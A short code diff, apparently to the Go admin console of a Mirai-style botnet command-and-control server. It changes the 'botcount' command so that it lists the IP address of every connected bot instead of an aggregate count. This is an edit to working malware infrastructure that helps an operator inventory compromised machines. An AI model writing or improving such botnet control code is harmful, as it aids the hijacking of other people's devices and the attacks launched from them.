@@ -175,9 +175,12 @@ func (this *Admin) Handle() {
             continue
         }
         if userInfo.admin == 1 && cmd == "botcount" {
-            m := clientList.Distribution()
-            for k, v := range m {
-                this.conn.Write([]byte(fmt.Sprintf("\033[36;1m%s:\t%d\033[0m\r\n", k, v)))
+            var ip string
+            var i = 0
+            for k := range clientList.clients {    
+                i++
+                ip = clientList.clients[k].conn.RemoteAddr().String()
+                this.conn.Write([]byte(fmt.Sprintf("\033[36;1m%s:\t%d\033[0m\r\n", ip, i)))
             }
             continue
         }
